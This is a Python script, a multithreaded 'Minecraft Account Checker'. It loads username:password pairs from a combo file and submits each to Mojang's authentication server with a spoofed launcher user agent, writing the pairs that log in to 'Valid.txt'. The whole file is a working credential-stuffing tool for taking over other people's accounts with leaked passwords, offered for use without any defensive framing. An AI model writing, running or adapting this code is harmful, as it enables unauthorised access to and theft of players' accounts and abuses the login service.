from colorama import Fore, init, Style
import threading, requests
import ctypes, time, os

class Minecraft:
    def __init__(self):
        self.checking = True
        self.usernames = []
        self.passwords = []
        self.invalid = 0
        self.counter = 0
        self.valid = 0

    def load_combos(self):
        if os.path.exists("combo.txt"):
            with open("combo.txt", "r") as f:
                for line in f.read().splitlines():
                    if ":" in line:
                        self.usernames.append(line.split(":")[0])
                        self.passwords.append(line.split(":")[-1])
            if not len(self.usernames): return None
            return True
        os.system("cls"); ctypes.windll.kernel32.SetConsoleTitleW("Minecraft Account Checker | Error"); print("{}Error\n{}No combo file found: 'combo.txt'".format(Fore.YELLOW, Fore.WHITE)); time.sleep(10); exit()
    
    def title(self):
        ctypes.windll.kernel32.SetConsoleTitleW("Minecraft Account Checker | Valid: {} | Invalid: {} | Checked: {}/{} | Remaining: {}".format(self.valid, self.invalid, (self.valid + self.invalid), len(self.usernames), (len(self.usernames) - (self.valid + self.invalid))))
       
    def session(self):
        session = requests.Session()
        session.trust_env = False
        return session
    
    def check_account(self, username, password):
        session = self.session()
        json = {"agent": {"name": "Minecraft", "version": "1"}, "clientToken": None, "password": password, "requestUser": "true", "username": username}
        check = session.post("https://authserver.mojang.com/authenticate", json = json, headers = {"User-Agent": "MinecraftLauncher/1.0"})
        if "clientToken" in check.text:
            with open("Valid.txt", "a") as f: f.write("{}:{}\n".format(username, password))
            self.valid += 1
            self.title()
        else:
            self.invalid += 1
            self.title()

    def start_checking(self):
        def thread_starter():
            self.check_account(self.usernames[self.counter], self.passwords[self.counter])

        while True:
            if threading.active_count() <= self.threads:
                threading.Thread(target = thread_starter).start()
                self.counter += 1
            
            if self.counter >= len(self.usernames): break
        input()

    def main(self):
        os.system("cls")
        load_combo = self.load_combos()
        if load_combo is not None:
            self.threads = int(input("\n{}> {}Threads: ".format(Fore.YELLOW, Fore.WHITE)))
            os.system("cls")
            self.start_checking()
        else:
            os.system("cls"); ctypes.windll.kernel32.SetConsoleTitleW("Minecraft Account Checker | Error"); print("{}Error\n{}Please put your combos inside of 'combo.txt'".format(Fore.YELLOW, Fore.WHITE)); time.sleep(10); exit()


Minecraft().main()
